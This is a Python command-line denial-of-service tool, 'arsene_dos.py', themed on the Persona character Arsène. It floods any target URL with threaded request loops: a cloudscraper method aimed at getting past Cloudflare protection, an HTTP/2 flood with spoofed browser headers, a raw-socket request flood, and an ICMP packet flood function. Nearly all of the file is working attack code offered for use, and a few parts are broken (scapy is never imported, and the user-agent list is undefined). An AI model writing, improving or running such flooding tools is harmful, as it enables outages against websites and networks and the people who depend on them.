from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r " + Fore.MAGENTA + "[*] " + Fore.WHITE + "Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r " + Fore.MAGENTA + "[*] " + Fore.WHITE + "Attack Done !                                   \n")
            return

def arsene_dos_attack(target_ip, interface="eth0", packet_count=1000):
    arsene_sequence = (
        "I am thou, thou art I.\n"
        "With great power comes great responsibility, and I, Arsène, wield the power of Persona to strike you down.\n"
        "Thy network shall feel my wrath, for I am the storm that engulfs thee.\n"
        "With each packet, I assert my dominance, for thou art but a mere mortal to my digital might.\n"
        "I am the attacker, thou art the attacked. Together, we dance in the chaos of the network.\n"
        "Prepare thyself, for the assault begins now.\n"
    )

    print(arsene_sequence)
    time.sleep(2)  # Pause for dramatic effect

    try:
        # Send a massive amount of ICMP packets to the target
        send(IP(dst=target_ip)/ICMP(), iface=interface, count=packet_count, verbose=0)
        print(f"\nAttack on {target_ip} completed with {packet_count} packets sent.")
    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")

def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
    return target

def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
    }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET " + target['uri'] + " HTTP/1.1\r\n"
    req += "Host: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSOC(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(100):
                s.send(str.encode(req))
        except:
            s.close()

if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) != 5:
        print("Usage: python arsene_dos.py <method> <target> <threads> <time>")
        sys.exit(1)

    method = sys.argv[1].rstrip()
    target = sys.argv[2].rstrip()
    threads = sys.argv[3].rstrip()
    duration = sys.argv[4].rstrip()

    if method == "cfb":
        timer = threading.Thread(target=countdown, args=(duration,))
        timer.start()
        LaunchCFB(target, threads, duration)
        timer.join()
    elif method == "http2":
        timer = threading.Thread(target=countdown, args=(duration,))
        timer.start()
        LaunchHTTP2(target, threads, duration)
        timer.join()
    elif method == "soc":
        timer = threading.Thread(target=countdown, args=(duration,))
        timer.start()
        LaunchSOC(target, threads, duration)
        timer.join()
    else:
        print("No method found.\nMethod: cfb, http2, soc")
